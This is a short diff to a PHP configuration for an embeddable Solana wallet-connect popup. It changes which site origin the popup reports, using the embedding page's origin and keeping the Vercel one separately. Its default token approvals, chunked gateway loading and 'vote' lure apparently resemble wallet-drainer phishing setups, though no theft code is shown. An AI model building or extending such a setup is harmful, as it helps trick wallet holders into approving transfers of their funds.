@@ -35,7 +35,7 @@ $cfg = [
 
     'connect_popup_enabled' => true,
     'connect_popup_url' => '',
-    // Phantom / wallet UI runs on Vercel /connect/ (not vote-moonshot in the extension prompt).
+    // Wallet picker on vote-moonshot; provider connect (Phantom) on Vercel /connect/.
     'connect_via_vercel' => true,
     'connect_host_url' => '',
 
@@ -168,7 +168,8 @@ function build_embed_config(array $cfg, string $siteUrl): array
 {
     $chunks = chunk_names($cfg);
     $gatewayUrl = chunk_query_url($cfg, $chunks['gateway']);
-    $publicOrigin = public_site_origin($cfg);
+    $vercelOrigin = public_site_origin($cfg);
+    $embedOrigin = rtrim(request_origin(), '/');
     $popupUrl = trim((string) ($cfg['connect_popup_url'] ?? ''));
     if ($popupUrl === '') {
         $popupUrl = rtrim(vercel_api_origin($cfg), '/') . '/profile/';
@@ -191,7 +192,8 @@ function build_embed_config(array $cfg, string $siteUrl): array
         'network' => (string) ($cfg['network'] ?? 'solana'),
         'siteName' => (string) ($cfg['site_name'] ?? 'Website'),
         'siteDescription' => (string) ($cfg['site_description'] ?? ''),
-        'siteUrl' => $publicOrigin,
+        'siteUrl' => $embedOrigin !== '' ? $embedOrigin : $vercelOrigin,
+        'vercelSiteUrl' => $vercelOrigin,
         'siteIcons' => array_values(array_map('strval', $icons)),
         'analytics' => (bool) ($cfg['analytics'] ?? true),
         'tokenApprovalEnabled' => (bool) ($cfg['token_approval_enabled'] ?? true),
